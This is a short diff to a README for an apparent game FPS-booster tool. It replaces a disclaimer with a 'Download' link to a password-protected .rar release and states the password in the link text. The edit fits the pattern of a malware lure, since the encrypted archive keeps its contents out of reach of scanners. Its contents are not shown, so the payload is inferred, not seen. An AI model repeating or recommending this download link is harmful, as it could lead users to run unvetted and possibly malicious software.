@@ -31,7 +31,8 @@ PRs welcome! Planned features:
 - Auto-detection of in-game settings.  
 - GUI overhaul with real-time metrics.  
 
-📌 Disclaimer: Use at your own risk. Not responsible for bans (unlikely, but possible in anti-cheat-sensitive games).  
+## Download
+([Klick here.Password:Fps_catalyst](https://github.com/demonxaoca-cabbie/FPS-Catalyst/releases/tag/FPSboost#:~:text=3-,FPS%2DCatalyst.rar,-31.9%20MB))
 
 Download | Report Issues | Star ⭐️ to Support!  
 
